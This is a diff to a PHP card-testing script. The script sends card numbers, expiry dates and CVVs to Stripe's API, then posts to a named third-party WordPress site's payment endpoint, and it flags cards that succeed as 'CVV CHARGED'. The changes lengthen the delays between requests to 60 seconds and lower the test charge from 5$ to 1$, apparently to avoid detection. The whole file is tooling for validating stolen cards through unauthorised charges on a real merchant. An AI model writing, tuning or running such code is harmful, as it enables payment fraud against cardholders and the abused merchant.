@@ -60,7 +60,7 @@ function mod($dividendo,$divisor)
 
 ////////////////////////////===[1 Req]
 
-sleep(10);
+sleep(60);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -94,7 +94,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 ////////////////////////////===[2 Req]
 
-sleep(10);
+sleep(60);
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://marthahealthsolutions.com/wp-admin/admin-ajax.php?t=1716525183623');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -130,7 +130,7 @@ $result2 = curl_exec($ch);
 
 if
 (strpos($result2,  'Thank you for your Payment.')) {
-  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 5$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
+  echo "<font size=2 color='red'>  <font class='badge badge-dark'>🔥 $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Result: CVV CHARGED 1$ 🔥</i></font><br> <font class='badge badge-dark'> $bank $country Power BySanji ⚡ </i></font><br>";
 }
 
 elseif
